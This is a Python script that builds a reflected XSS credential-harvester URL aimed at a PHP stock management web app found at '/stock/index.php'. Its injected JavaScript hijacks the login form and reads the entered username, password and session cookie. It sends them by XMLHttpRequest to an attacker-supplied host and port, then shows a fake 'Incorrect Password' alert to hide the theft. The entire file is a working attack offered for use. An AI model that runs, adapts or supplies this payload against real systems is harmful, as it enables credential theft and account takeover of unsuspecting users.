import sys, urllib,re
from colorama import Fore, Back, Style


def urlEncode(javascript):
    return urllib.quote(javascript)

def genXssPayload(LHOST,LPORT):
    XSS_PAYLOAD = '/" method="post" id="loginForm"><script>'
    XSS_PAYLOAD += 'document.forms[0].action = \'/stock/index.php\';'
    XSS_PAYLOAD += 'document.forms[0].onsubmit = function sendCreds(){'
    XSS_PAYLOAD += 'var username = document.forms[0].elements[1].value;'
    XSS_PAYLOAD += 'var password = document.forms[0].elements[2].value;'
    XSS_PAYLOAD += 'var dFslash = "%2f%2f";'
    XSS_PAYLOAD += 'var uri = "http:"+decodeURIComponent(dFslash)+"'+LHOST+':'+LPORT+'/get.php?|USER="+username+"|PASS="+password+"|"+document.cookie;'
    XSS_PAYLOAD += 'xhr = new XMLHttpRequest();'
    XSS_PAYLOAD += 'xhr.open("GET", uri, true);'
    XSS_PAYLOAD += 'xhr.send();'
    XSS_PAYLOAD += 'alert("Incorrect Password, please try again.");'
    XSS_PAYLOAD += '};'
    XSS_PAYLOAD += 'document.forms[0].id = \'loginForm\';'
    XSS_PAYLOAD += 'var links = document.getElementsByTagName("link");'
    XSS_PAYLOAD += 'links[0].href = "/stock/assests/bootstrap/css/bootstrap.min.css";'
    XSS_PAYLOAD += 'links[1].href = "/stock/assests/bootstrap/css/bootstrap-theme.min.css";'
    XSS_PAYLOAD += 'links[2].href = "/stock/assests/font-awesome/css/font-awesome.min.css";'
    XSS_PAYLOAD += 'links[3].href = "/stock/custom/css/custom.css";'
    XSS_PAYLOAD += 'links[4].href = "/stock/assests/jquery-ui/jquery-ui.min.css";'
    XSS_PAYLOAD += '</script><p name="DelMe'
    return XSS_PAYLOAD

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print "(+) Usage:   python %s <WEBAPP_URL> <LHOST> <LPORT>" % sys.argv[0]
        print "(+) Example: python %s 'http://172.16.65.130/stock/' '172.16.65.1' '80'" % sys.argv[0]
        sys.exit(-1)
    WEBAPP_URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    if not re.match(r".*/$", WEBAPP_URL):
        WEBAPP_URL = WEBAPP_URL+'/'
    WEBAPP_URL = WEBAPP_URL+'index.php'
    PAYLOAD = genXssPayload(LHOST,LPORT)
    ENCODED_PAYLOAD = urlEncode(PAYLOAD)
    print(Style.BRIGHT+Fore.BLUE+'[+] '+Fore.RESET+'To execute the '+Fore.RED+'Reflected XSS Credential-Harvester Attack'+Fore.RESET+', have an '+Fore.GREEN+'Unauthenticated User '+Fore.RESET+'click  '+Fore.CYAN+'this URL'+Fore.RESET+' and '+Fore.BLUE+'login'+Fore.RESET+':')
    print Fore.CYAN+WEBAPP_URL+ENCODED_PAYLOAD+Fore.RESET
